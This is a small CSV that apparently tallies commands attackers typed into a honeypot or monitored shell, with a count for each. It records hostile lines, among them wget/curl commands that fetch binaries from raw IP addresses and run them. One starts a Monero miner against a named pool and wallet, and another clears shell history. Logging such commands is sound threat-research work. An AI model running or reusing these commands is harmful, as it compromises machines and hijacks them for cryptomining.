﻿"Command Line Input",Count
shell,18
system,18
"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s",9
enable,9
sh,9
"while read i",9
"rm .s; exit",8
"wget http://45.90.161.105/systemd && chmod +x * && ./systemd -o de.minexmr.com:443 -B -u 8BHQUunQHax1XjPonUxPKk1H4EKP6SdXnMtyyY5W9Bts7qM7uq5XsjjXiPj1zacMGP8chCv4cumYZRYfH5cUBGshKy1gssW -k --tls --rig-id Main",8
"cd /tmp ; wget http://208.115.245.158/c --no-check-certificate; curl -O http://208.115.245.158/c ; chmod 777 c* ; ./c ; rm -rf -c* ; history -c",4
"./E0Iq9cU8",2
